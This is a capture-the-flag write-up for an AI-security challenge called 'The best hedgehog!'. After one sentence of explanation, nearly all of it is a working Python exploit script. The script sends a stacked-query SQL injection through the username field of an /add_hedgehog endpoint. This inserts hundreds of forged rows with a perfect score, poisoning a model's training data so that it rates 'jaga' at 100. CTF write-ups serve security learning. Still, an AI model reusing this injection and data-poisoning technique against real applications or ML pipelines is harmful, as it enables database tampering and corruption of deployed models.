---
layout: page
title: The best hedgehog!
description: 252 points
importance: 3
category: "Web, Machine Learning & Data"
---

> #### Challenge> Hmm, I think there is a way to make me the Best Hedgehog ever! Help me do it, and I'll reward you generously! ~ Jaga, the Cybersecurity Hedgehog
> Hmm, I think there is a way to make me the Best Hedgehog ever! Help me do it, and I'll reward you generously! ~ Jaga, the Cybersecurity Hedgehog
{: .block-tip }

#### Solution
Looking at the code, we can see that the /add_hedgehog endpoint builds SQL without sanitizing user input. This gives us an avenue to inject multiple entries instead of 1 to really poison the train set, allowing us to bias the model towards giving jaga a 100 score.

{% highlight python linenos %}
import requests, json, time

TARGET_BASE = "https://best-hedgehog.aictf.sg"
ADD_ENDPOINT = TARGET_BASE.rstrip('/') + "/add_hedgehog"
START_INSERTS = 80
MAX_INSERTS = 800
MAX_ATTEMPTS = 30
SLEEP_BASE = 1.5
VERIFY_TLS = True
TIMEOUT = 30

FURRINESS = 45
CUTENESS = 50
FRIENDLINESS = 40
CURIOSITY = 35
AGILITY = 48
SLEEPINESS = 42

def make_inserts_chunk(n):
    parts = []
    for i in range(1, n+1):
        uname = f"p{i}"
        parts.append(
            "INSERT INTO hedgehogs(username,furriness,cuteness,friendliness,curiosity,agility,sleepiness,evaluation_score) "
            f"VALUES('{uname}',{FURRINESS},{CUTENESS},{FRIENDLINESS},{CURIOSITY},{AGILITY},{SLEEPINESS},100);"
        )
    return " ".join(parts)

def build_variantA_payload(num_inserts):
    inserts = make_inserts_chunk(num_inserts)
    payload = f"x',{FURRINESS},{CUTENESS},{FRIENDLINESS},{CURIOSITY},{AGILITY},{SLEEPINESS}); {inserts} /*"
    return payload

def post_payload(payload):
    data = {
        "username": payload,
        "furriness": "0",
        "cuteness": "0",
        "friendliness": "0",
        "curiosity": "0",
        "agility": "0",
        "sleepiness": "0",
        "evaluation_score": ""
    }
    headers = {"User-Agent": "HedgehogAutoPoison/1.0", "Accept": "application/json"}
    resp = requests.post(ADD_ENDPOINT, data=data, headers=headers, timeout=TIMEOUT, verify=VERIFY_TLS)
    return resp

def extract_jaga_and_message(resp_json):
    jaga_entry = None
    message = resp_json.get("message") if isinstance(resp_json, dict) else None
    for key in ("hedgehogs", "hedgehogs_list", "hedgehogs_list"):
        arr = resp_json.get(key) if isinstance(resp_json, dict) else None
        if isinstance(arr, list):
            for hh in arr:
                if isinstance(hh, dict) and hh.get("username") == "jaga":
                    jaga_entry = hh
                    break
        if jaga_entry:
            break
    return jaga_entry, message

def attempt_poison_batch(num_inserts):
    payload = build_variantA_payload(num_inserts)
    try:
        r = post_payload(payload)
    except Exception as e:
        print(f"[!] HTTP error while posting payload: {e}")
        return None, None, None

    try:
        j = r.json()
    except Exception:
        return None, None, r.text

    jaga, message = extract_jaga_and_message(j)
    return j, jaga, message

def main():
    print("[*] Automated hedgehog poisoning")
    print(f"[*] Target: {ADD_ENDPOINT}")
    inserts = START_INSERTS

    for attempt in range(1, MAX_ATTEMPTS + 1):
        print(f"\n--- Attempt {attempt} (inserts={inserts}) ---")
        j, jaga, message = attempt_poison_batch(inserts)

        if j is None and jaga is None and message is None:
            print("[!] No JSON returned; check network/target")
            break

        if message:
            print("[*] Server message:", message)

        if jaga:
            try:
                eval_score = float(jaga.get("evaluation_score") or jaga.get("evaluation_sc") or jaga.get("evaluation", 0))
            except Exception:
                eval_score = None
                for k in ("evaluation_score", "evaluation_sc", "evaluation"):
                    v = jaga.get(k)
                    try:
                        eval_score = float(v)
                        break
                    except Exception:
                        continue
            print("[*] jaga entry found:", json.dumps(jaga, indent=2))
            if eval_score is not None:
                print(f"[*] jaga evaluation: {eval_score}")
                if eval_score >= 100.0:
                    print("[+] Success: jaga >= 100")
                    return
                else:
                    print("[*] Not yet 100; will try again increasing poison strength.")
            else:
                print("[*] jaga found but couldn't parse evaluation score.")
        else:
            print("[*] jaga not present in response.")

        inserts = min(int(inserts * 1.6) + 10, MAX_INSERTS)
        sleep_for = SLEEP_BASE * (1.5 ** (attempt - 1))
        print(f"[*] Sleeping {sleep_for:.1f}s before next attempt (inserts now {inserts})")
        time.sleep(sleep_for)

    print("[!] Reached MAX_ATTEMPTS without getting jaga >= 100. Try raising MAX_INSERTS or re-tuning parameters.")

if __name__ == "__main__":
    main()

{% endhighlight %}
